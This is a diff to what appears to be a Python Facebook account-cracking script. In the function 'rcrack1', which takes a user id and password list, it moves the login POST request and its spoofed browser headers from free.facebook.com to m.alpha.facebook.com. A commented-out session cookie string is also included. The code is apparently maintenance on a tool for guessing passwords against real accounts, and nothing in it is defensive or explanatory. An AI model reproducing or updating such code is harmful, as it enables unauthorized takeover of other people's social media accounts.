@@ -530,7 +530,7 @@ def rcrack1(uid,pwx,tl):
 
             "login":"Log In"}
 
-            header_freefb = {'authority': 'free.facebook.com',
+            header_freefb = {'authority': 'm.alpha.facebook.com',
             'method': 'GET', 
             'scheme': 'https', 
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -538,7 +538,7 @@ def rcrack1(uid,pwx,tl):
             'cache-control': 'max-age=0',
             # 'cookie': 'sb=Xq4iZonTrfV_leYf6nPacQet; datr=Xq4iZu2ozZ19Gkb2TVJOaDkd; ps_n=1; ps_l=1; locale=en_US; dpr=3.752533197402954; m_pixel_ratio=3.752533197402954; wd=685x1257; fr=0xfDlbIj9EYumAA8K.AWWy_XhXfZkl5zA5Z4QSvi9PYk0.BmIq5e..AAA.0.0.BmI9lv.AWWL5x2XBhY',
             'dpr': '2.625',
-            'referer': 'https://free.facebook.com/',
+            'referer': 'https://m.alpha.facebook.com/',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="122", "Google Chrome";v="122"',
             'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="122.0.6295.197", "Google Chrome";v="122.0.6295.197"',
@@ -553,7 +553,7 @@ def rcrack1(uid,pwx,tl):
             'upgrade-insecure-requests': '1',
             'user-agent': 'pro',
             'viewport-width': '980',}
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
 
             log_cookies=session.cookies.get_dict().keys()
 
